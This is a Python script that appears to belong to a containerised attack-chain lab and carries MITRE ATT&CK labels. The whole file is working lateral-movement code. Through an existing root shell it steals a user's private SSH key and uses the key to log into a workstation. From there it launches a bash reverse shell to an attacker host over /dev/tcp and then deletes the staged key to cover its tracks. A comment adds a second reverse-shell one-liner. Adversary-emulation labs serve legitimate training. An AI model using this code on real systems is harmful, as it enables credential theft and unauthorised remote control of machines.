import base64
import re
import socket
import threading
import time

# =============================================================================
# lateral_movement.py — Lateral Movement via Stolen Deploy Key
# MITRE ATT&CK:
#   T1552.001 – Credentials In Files   (key discovery in john's home on apache)
#   T1021.004 – Remote Services: SSH   (key-authenticated SSH to workstation)
#   T1078     – Valid Accounts         (reuse of john.stravidis identity)
# =============================================================================

KALI_HOST        = "10.10.0.2"
WORKSTATION_IP   = "10.30.0.5"
WORKSTATION_USER = "john.stravidis"
WORKSTATION_PORT = 22
PORT_JOHN        = 6666

DEPLOY_LOG_PATH  = "/opt/waystar-connect/deploy.log"
REMOTE_KEY_PATH  = "/home/john.stravidis/.ssh/id_ed25519"
STAGED_KEY_PATH  = "/tmp/john_deploy_key"


def send_command(shell, command):
    """Send a command through an active shell connection."""
    shell.sendall((command + "\n").encode())
    time.sleep(0.5)


_sentinel_seq = 0


def _drain(shell):
    """Discard stale bytes left in the socket buffer from a previous command."""
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=10):
    """
    Send cmd to shell, collect output, return it.

    Drains stale socket data first, then sends the command and a uniquely-
    numbered sentinel as two separate lines.  Bash echoes the sentinel line
    AFTER the command output, so buf[:sentinel_pos] captures the real output.
    """
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.5)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev_timeout = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev_timeout)

    # The sentinel appears in bash's echo of "echo SENTINEL_..._END".
    # Everything before that echo is the actual command output (plus prompts).
    if sentinel in buf:
        buf = buf[:buf.index(sentinel)]

    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    buf = buf.replace("\r", "")
    return buf.strip()


def _stage_key_on_apache(root_shell, key_text):
    """
    Write the private key to STAGED_KEY_PATH on apache via the root shell.
    Uses base64 encoding to avoid shell-quoting issues with PEM newlines.
    Returns True on success.
    """
    key_b64 = base64.b64encode(key_text.encode()).decode()
    stage_cmd = (
        f"printf '%s\\n' '{key_b64}' | base64 -d > {STAGED_KEY_PATH} "
        f"&& chmod 600 {STAGED_KEY_PATH} && echo KEY_OK"
    )
    result = _run_remote(root_shell, stage_cmd)
    return "KEY_OK" in result


def _read_id(shell, timeout=10):
    """Send 'id' and return the response string."""
    send_command(shell, "id")
    prev = shell.gettimeout()
    shell.settimeout(5)
    response = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = shell.recv(1024).decode(errors="replace")
            if chunk:
                response += chunk
                if "uid=" in response:
                    break
        except socket.timeout:
            break
    shell.settimeout(prev)
    return response


def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
                        workstation_port, kali_host, kali_port):
    """
    SSH from apache to workstation and trigger a reverse bash shell back to kali.
    Runs in a background thread — the connection stays open while the shell lives.
    """
    ssh_cmd = (
        f"ssh -f -n -i {STAGED_KEY_PATH} "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-p {workstation_port} "
        f"{workstation_user}@{workstation_ip} "
        f'"bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1" '
        f">/dev/null 2>&1 &"
    )
    send_command(root_shell, ssh_cmd)


def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT):
    """
    Execute the lateral-movement step.

    Args:
        root_shell (socket):    root shell on apache (from privesc step).
        kali_host (str):        kali IP for reverse-shell callback.
        workstation_ip (str):   target workstation IP, or None to discover
                                via deploy.log (standalone / fallback mode).
        workstation_user (str): SSH username on workstation.
        workstation_port (int): SSH port on workstation.

    Returns:
        socket: reverse shell as john.stravidis on the workstation, or None.
    """
    print("\n[*] Starting lateral movement to workstation...")

    # ------------------------------------------------------------------
    # Phase 1 — Credential discovery: deploy.log + private key on apache
    # ------------------------------------------------------------------
    # workstation_ip=None  → parse deploy.log (standalone / --only lateral)
    # workstation_ip=<ip>  → creds step already discovered it, skip parsing
    if workstation_ip is not None:
        print(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
    else:
        workstation_ip = WORKSTATION_IP   # set fallback before possible override below
        print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
        log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")

        match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
        if match:
            workstation_user = match.group(1)
            workstation_ip   = match.group(2)
            print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
        else:
            print(f"[!] Could not parse deploy.log; using defaults "
                  f"({workstation_user}@{workstation_ip})")

    print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
    raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)

    key_start = raw_key.find("-----BEGIN OPENSSH PRIVATE KEY-----")
    key_end   = raw_key.find("-----END OPENSSH PRIVATE KEY-----")
    if key_start < 0 or key_end < 0:
        print(f"[-] Private key not found at {REMOTE_KEY_PATH}")
        return None
    key_text = raw_key[key_start:key_end + len("-----END OPENSSH PRIVATE KEY-----")] + "\n"
    print("[+] Deploy key retrieved")

    # ------------------------------------------------------------------
    # Phase 2 — Stage key on apache, pre-verify SSH connectivity
    # ------------------------------------------------------------------
    print(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
    if not _stage_key_on_apache(root_shell, key_text):
        print("[-] Failed to stage deploy key on apache")
        return None
    print("[+] Key staged successfully")

    print(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
    verify_out = _run_remote(
        root_shell,
        f"ssh -i {STAGED_KEY_PATH} "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-o ConnectTimeout=8 "
        f"-p {workstation_port} "
        f"{workstation_user}@{workstation_ip} id",
        timeout=15,
    )
    if "uid=" not in verify_out:
        print(f"[-] SSH pre-check failed. Output: {verify_out!r}")
        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
        return None
    print(f"[+] SSH pre-check passed: {verify_out.strip()}")

    # ------------------------------------------------------------------
    # Phase 3 — Set up listener and trigger reverse shell
    # ------------------------------------------------------------------
    john_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    john_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    john_server.bind(("0.0.0.0", PORT_JOHN))
    john_server.listen(1)
    print(f"[*] Waiting for john.stravidis shell on port {PORT_JOHN}...")

    t = threading.Thread(
        target=_fire_reverse_shell,
        args=(root_shell, workstation_user, workstation_ip,
              workstation_port, kali_host, PORT_JOHN),
        daemon=True,
    )
    t.start()

    john_server.settimeout(20)
    try:
        john_shell, addr = john_server.accept()
        print(f"[+] Shell received from {addr[0]}")
    except socket.timeout:
        print("[-] Timeout — no shell received from workstation")
        print("    → check workstation can reach kali: route -n")
        print(f"    → check ssh works manually: ssh -i {STAGED_KEY_PATH} "
              f"{workstation_user}@{workstation_ip}")
        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
        print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
        return None
    finally:
        john_server.close()

    # ------------------------------------------------------------------
    # Phase 4 — Confirm identity + clean up staged key
    # ------------------------------------------------------------------
    time.sleep(1)
    response = _read_id(john_shell)

    if "john.stravidis" in response:
        print("[+] Lateral movement successful!")
        print(f"[+] {response.strip()}")
    else:
        print("[-] john.stravidis not confirmed in id output")
        print(f"[?] Response: {response!r}")

    send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
    print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")

    return john_shell


# Test mode — not executed when imported by main.py.
# Usage: docker compose exec kali python3 /Attack-chain/lateral_movement.py
# Then in another terminal:
#   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
if __name__ == "__main__":
    print("[*] Test mode — waiting for root shell on port 5555")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 5555))
    test_server.listen(1)

    try:
        root_shell_sock, addr = test_server.accept()
        print(f"[+] Root shell received from {addr[0]}")
    finally:
        test_server.close()

    result = run(root_shell_sock)
    print(f"\n[*] Result: {'success — john.stravidis shell active' if result else 'failed'}")
